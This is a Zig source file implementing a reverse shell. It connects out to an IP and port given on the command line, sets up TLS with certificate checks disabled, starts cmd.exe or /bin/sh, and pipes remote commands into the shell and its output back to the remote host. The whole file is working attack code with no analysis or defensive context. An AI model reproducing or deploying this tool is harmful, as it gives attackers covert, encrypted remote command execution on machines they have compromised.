const std = @import("std");
const builtin = @import("builtin");

pub fn main() !void {
    var gpa = std.heap.GeneralPurposeAllocator(.{}){};
    defer _ = gpa.deinit();
    const allocator = gpa.allocator();

    const args = try std.process.argsAlloc(allocator);
    defer std.process.argsFree(allocator, args);

    if (args.len != 3) {
        std.debug.print("Usage: {s} <IP> <PORT>\n", .{args[0]});
        return;
    }

    const target_hostname = args[1];
    const target_port_str = args[2];

    const target_port = std.fmt.parseInt(u16, target_port_str, 10) catch |err| {
        std.debug.print("Error parsing port '{s}': {}\n", .{ target_port_str, err });
        return;
    };

    var shell: []const []const u8 = undefined;

    if (builtin.os.tag == .windows) {
        shell = &[_][]const u8{"cmd.exe"};
        std.debug.print("[+] Using cmd.exe as the shell\n", .{});
    } else if ((builtin.os.tag == .linux) or (builtin.os.tag == .macos)) {
        shell = &[_][]const u8{"/bin/sh"};
        std.debug.print("[+] Using /bin/sh as the shell\n", .{});
    } else {
        std.debug.print("[-] Cannot detect target OS\n", .{});
        return;
    }

    std.debug.print("[+] Connecting to {s}:{d}\n", .{ target_hostname, target_port });

    // Create TCP connection
    const address_list = try std.net.getAddressList(allocator, target_hostname, target_port);
    defer address_list.deinit();

    const stream = std.net.tcpConnectToAddress(address_list.addrs[0]) catch {
        std.debug.print("[-] Connection failed\n", .{});
        return;
    };
    defer stream.close();

    // Initialize TLS client
    var tls_client = std.crypto.tls.Client.init(stream, .{
        .host = .no_verification,
        .ca = .self_signed,
    }) catch |err| {
        std.debug.print("[-] TLS initialization failed: {}\n", .{err});
        return;
    };

    std.debug.print("[+] TLS connection established\n", .{});

    // Start shell process
    var process = std.process.Child.init(shell, allocator);
    process.stdin_behavior = .Pipe;
    process.stdout_behavior = .Pipe;
    process.stderr_behavior = .Pipe;

    try process.spawn();
    defer _ = process.kill() catch {};

    var buffer: [4096]u8 = undefined;

    // Main I/O loop - similar to your original working version
    while (true) {
        // Read command from TLS connection
        const bytes_read = tls_client.read(stream, &buffer) catch break;
        if (bytes_read == 0) break;

        // Send command to process stdin
        _ = process.stdin.?.write(buffer[0..bytes_read]) catch break;

        // Small delay to let command execute
        std.time.sleep(100 * std.time.ns_per_ms);

        // Try to read stdout first
        if (process.stdout.?.read(&buffer)) |stdout_len| {
            if (stdout_len > 0) {
                _ = tls_client.writeAll(stream, buffer[0..stdout_len]) catch break;
            }
        } else |_| {
            // If no stdout, try stderr
            if (process.stderr.?.read(&buffer)) |stderr_len| {
                if (stderr_len > 0) {
                    _ = tls_client.writeAll(stream, buffer[0..stderr_len]) catch break;
                }
            } else |_| {
                // If no output available, send a prompt or newline
                _ = tls_client.writeAll(stream, "\n") catch break;
            }
        }
    }

    // Wait for process to finish
    _ = process.wait() catch {};
    std.debug.print("[+] Session ended\n", .{});
}
